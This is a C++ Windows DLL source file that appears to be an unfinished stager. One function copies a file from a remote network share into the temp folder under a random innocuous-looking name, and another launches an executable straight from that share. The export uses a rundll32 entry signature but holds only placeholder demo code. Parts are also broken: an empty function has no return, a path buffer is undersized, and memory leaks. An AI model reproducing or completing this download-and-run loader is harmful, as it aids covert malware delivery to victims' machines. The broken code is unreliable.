// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <iostream>
#include <stdlib.h>
#include <wchar.h>
#include <pathcch.h>
#include <string.h>
#include <vector>

#pragma comment(lib, "Pathcch.lib")

const int number_of_elements = 4;
const WCHAR  * legit_files[] = { L"shahar", L"ziv", L"daniel", L"blabla" };

const WCHAR * remote_base_path = L"\\\\127.0.0.1\\c$\\Users\\shahar\\Desktop";


// Get the name of the file to download.
// Returns the local path of the file (if succeed, NULL on failure.)
// The local path needs to be freed when not used.
WCHAR * get_remote_file(WCHAR * download_file)
{
	// Count of random names.
	int random_names_count = sizeof(legit_files) / sizeof(legit_files[0]);

	// Random value to choise the local file name.
	int random_value = rand() % random_names_count;
	if (random_value < 0 || random_value > 3)
	{
		printf("[-] Random went terribly wrong. random_value: %d\n", random_value);
		printf("[-] Setting random value to 0.\n");
		random_value = 0;
	}

	int return_value;

	// We return temp_path, so the caller must remember to free it.
	WCHAR * temp_path = (WCHAR *)malloc(MAX_PATH);
	return_value = GetTempPath(MAX_PATH, temp_path);
	if (return_value == 0)
	{
		printf("[-] GetTempPath failed. Error: %d\n", GetLastError());
		return NULL;
	}

	// Creating the local path (temp_path + random file name, e.g c:\windows\temp\legitfile.txt)
	HRESULT hresult_return_value = PathCchAppend(temp_path, return_value, legit_files[random_value]);
	if (hresult_return_value != S_OK)
	{
		printf("[-] Could not create local file path string. HRESULT error: %ld\n", hresult_return_value);
		return NULL;
	}

	// Declaring the remote path variable.
	size_t size_of_remote_base_path = (wcslen(remote_base_path) + 1) * sizeof(wchar_t);
	wchar_t * finale_remote_path = (wchar_t *)malloc(size_of_remote_base_path);

	// Copying the path to a variable (not constant).
	return_value = wcscpy_s(finale_remote_path, size_of_remote_base_path / sizeof(wchar_t), remote_base_path);
	if (return_value != 0)
	{
		printf("[-] Error: error on wcscpy_s: %d.\n", return_value);
		return NULL;
	}

	// Creating the remote path (remote path + the downloadl_file parameter)
	hresult_return_value = PathCchAppend(finale_remote_path, wcslen(finale_remote_path) + 1, download_file);
	if (hresult_return_value != S_OK)
	{
		printf("[-] Could not create remote file path string. HRESULT error: %ld\n", hresult_return_value);
		return NULL;
	}

	// Copying remote file to local path.
	return_value = CopyFile(finale_remote_path, temp_path, false);
	if (return_value == 0)
	{
		printf("[-] Failed to CopyFile.\n");
		return NULL;
	}

	free(finale_remote_path);

	// The local file path. ****Important: It is from the heap, so free it when you are done with it.****
	return temp_path;
}

int run_remote_exe(TCHAR exefile[])
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	int return_value; // Return value.
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));

	HRESULT hresult_return_value;

	// Copying the constant remote path to a variable.
	size_t size_of_remote_path = (wcslen(remote_base_path) + 1) * sizeof(wchar_t);
	wchar_t * finale_remote_path = (wchar_t *)malloc(size_of_remote_path);
	return_value = wcscpy_s(finale_remote_path, size_of_remote_path / sizeof(wchar_t), remote_base_path);
	if (return_value != 0)
	{
		printf("[-] Error: error on wcscpy_s: %d.\n", return_value);
		return NULL;
	}

	// Creating the remote path (remote path + the downloadl_file parameter)
	hresult_return_value = PathCchAppend(finale_remote_path, wcslen(finale_remote_path) + 1, exefile);
	if (hresult_return_value != S_OK)
	{
		printf("[-] Could not create remote exe file path string. HRESULT error: %ld\n", hresult_return_value);
		return 0;
	}

	// Creating child process.
	return_value = CreateProcess(NULL,
		finale_remote_path,
		NULL,
		NULL,
		true,
		NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
		NULL,
		NULL,
		&si,
		&pi);

	if (return_value == 0)
	{
		wprintf(L"[-] Error creating process: %s. \nError: %d.\n", exefile, GetLastError());
		return 0;
	}
	wprintf(L"[+] Succeed creating process %s.\n", exefile);
	free(finale_remote_path);
	return 1;
}

std::vector<std::wstring> split_string(std::wstring to_split)
{

}

extern "C" __declspec(dllexport) int run_exe_from_netapp(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	char * token = NULL;
	char str[] = "A bird came down the walk";
	rsize_t strmax = sizeof str;
	const char *delim = " ";
	char *next_token;
	printf("Parsing the input string '%s'\n", str);
	token = strtok_s(str, delim, &next_token);
	while (token) {
		MessageBoxA(NULL, token, "asdas", 0);
		token = strtok_s(NULL, delim, &next_token);
	}
	getchar();
	return 0;
}

//BOOL APIENTRY DllMain( HMODULE hModule,
//                       DWORD  ul_reason_for_call,
//                       LPVOID lpReserved
//                     )
//{
//    switch (ul_reason_for_call)
//    {
//    case DLL_PROCESS_ATTACH:
//		return true;
//    case DLL_THREAD_ATTACH:
//		return true;
//    case DLL_THREAD_DETACH:
//		return true;
//    case DLL_PROCESS_DETACH:
//		return true;
//        break;
//    }
//    return TRUE;
//}